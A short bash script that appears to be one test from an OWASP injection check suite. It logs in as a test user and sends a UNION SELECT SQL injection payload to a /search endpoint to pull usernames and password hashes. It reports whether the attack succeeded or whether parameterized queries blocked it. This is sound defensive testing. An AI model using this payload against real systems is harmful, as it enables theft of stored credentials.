#!/usr/bin/env bash
# OWASP A03:2021 Injection - SQL injection en /search (UNION SELECT de hashes)
source "$(dirname "$0")/lib.sh" "$@"

jar="$(login bob bob123)"
out="$EVIDENCE_DIR/01-sqli-search.html"
payload="' UNION SELECT 1, username, password_hash, 'x', 0, 'y' FROM users -- "

code=$(curl_ -b "$jar" -G "$target/search" --data-urlencode "q=$payload" -o "$out" -w '%{http_code}')
say "GET /search?q=<payload UNION SELECT> -> HTTP $code"

if grep -qE '[0-9a-f]{32}' "$out"; then
    say "ATAQUE EXITOSO: la inyeccion devolvio hashes de contrasenas"
    say "evidence=$out"
    exit 0
fi
say "BLOQUEADO: la consulta parametrizada trato el payload como texto"
say "evidence=$out"
exit 1
